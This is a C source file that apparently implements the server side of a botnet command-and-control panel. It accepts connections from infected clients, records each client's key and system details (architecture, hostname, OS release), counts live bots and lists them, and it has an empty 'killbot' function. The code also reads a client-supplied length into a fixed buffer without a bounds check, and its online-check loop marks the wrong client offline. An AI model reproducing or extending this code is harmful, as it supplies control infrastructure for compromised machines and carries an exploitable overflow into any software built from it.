#include "common/net_server.h"
#include "common/libstring.h"
#include <unistd.h>

extern int32_t svsocket;
extern clients_d client_data[Kb];
uint16_t connections = 0;

uint32_t CreateSocket(char *myip, int porta) {
  int mycnc;
  struct sockaddr_in myaddr;

  myaddr.sin_family = AF_INET;
  myaddr.sin_addr.s_addr = inet_addr(myip);
  myaddr.sin_port = htons(porta);

  mycnc = socket(AF_INET, SOCK_STREAM, 0);
  if (mycnc < 0) {
    puts("[SOCKET]An error occurred while trying to create the socket!");
    return 1;
  }

  if (bind(mycnc, (struct sockaddr *)&myaddr, sizeof(myaddr))) {
    puts("[SOCKET] An error occurred while trying to bind the port with the "
         "address");
    return 1;
  }

  printf("%s[SOCKET]%s Socket created successfully!!\n", GREEN, RESET);
  return mycnc;
}

uint32_t InitConec(char *myip, int porta) {

  if (df_strlen(myip) < 10 || porta == 0)
    return 1;

  pthread_t threads[10];
  if ((svsocket = CreateSocket(myip, porta)) == 1) {
    printf("%s[CRITICAL]%s Aborting the connection!\n", RED, RESET);
    return 1;
  }

  printf("%s[SOCKET]%s Starting the listing process...\n", GREEN, RESET);

  if ((listen(svsocket, Kb)) < 0) {
    printf("%s[SOCKET->LISTEN]%s An error occurred while trying to list the "
           "socket\n",
           RED, RESET);
    return 1;
  }
  printf("%s[SOCKET]%s The listing process is working!\n", GREEN, RESET);

  pthread_create(&threads[1], NULL, (void *)InfiniteAccept, NULL);
  return 0;
}

uint32_t InfiniteAccept(void *msock) {
  size_t payload_lenght;
  while (connections != Kb) {
    payload_lenght = 0;
    df_szero(&client_data[connections].unme,
             sizeof(client_data[connections].unme));
    client_data[connections].clilen = sizeof(client_data[connections].cli_addr);
    client_data[connections].newsockfd =
        accept(svsocket, (struct sockaddr *)&client_data[connections].cli_addr,
               &client_data[connections].clilen);

    read(client_data[connections].newsockfd, &client_data[connections].key,
         sizeof(client_data[connections].key));

    read(client_data[connections].newsockfd, &payload_lenght, sizeof(size_t));
    read(client_data[connections].newsockfd,
         (unsigned char *)&client_data[connections].unme, payload_lenght);

    printf("\n%s[WARNING]%s Key %s connected!\n", GREEN, RESET,
           client_data[connections].key);

    client_data[connections].on = 1;
    client_data[connections].id = connections;
    connections++;
  }
  return 0;
}

unsigned int onlines() {
  unsigned int indice = 0, on = 0;
  while (indice < connections) {
    if ((send(client_data[indice].newsockfd, "!", 1, 0)) < 0) {
      indice++;
      client_data[indice].on = 0;
      continue;
    }
    indice++;
    on++;
  }
  return on;
}

void listclients(void) {
  unsigned int indice = 0;
  while (indice < connections) {
    if (client_data[indice].on != 0) {
      puts("-----------------------------------------");
      printf("\tKey       : %s\n", client_data[indice].key);
      printf("\tArch      : %s\n", client_data[indice].unme.machine);
      printf("\tNodename  : %s\n", client_data[indice].unme.nodename);
      printf("\tRelease   : %s\n", client_data[indice].unme.release);
      printf("\tSysname   : %s\n", client_data[indice].unme.sysname);
    }
    indice++;
  }
}
void killbot(void) {}
